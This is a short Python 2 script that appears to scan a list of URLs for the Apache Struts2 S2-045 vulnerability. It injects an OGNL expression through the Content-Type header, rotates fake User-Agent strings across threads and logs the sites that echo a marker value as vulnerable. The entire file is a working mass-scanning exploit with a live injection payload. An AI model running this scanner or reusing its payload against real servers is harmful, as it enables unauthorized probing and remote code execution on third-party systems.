import requests
import random
import sys
import threading





def poc(urlss):
    urls = open(urlss, 'r')
    for url in urls.readlines():
       threading.Thread(target=urlthread,args=(url,headers,)).start()
    urls.close()



def urlthread(url,headers):
        url = url.strip('\n')
        try:
            
            headers["User-Agent"] = usage[random.randrange(0,len(usage))]
            r = requests.get(url, headers=headers)
            
            if "5246025" in r.content:
                with open('detectresult', 'a') as detectresult:
                    detectresult.write(url+'\n')
                    print "vulneravle:"+url
            else:
                    print "novulneravle:"+url
        except:
            print "sorry:"+url

        

if __name__ == '__main__':
    #detectresult=open("detectresult","a")

    if len(sys.argv) == 1:

        print "python s2-045.py txt"

        sys.exit()

    else:
        payload = "%{(#test='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(5246025)).(#ros.flush())}"

        usage = [
            "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
            "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
            "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
            "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
            "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
        ]

        headers = {}
        headers["Content-Type"] = payload
        poc(sys.argv[1])

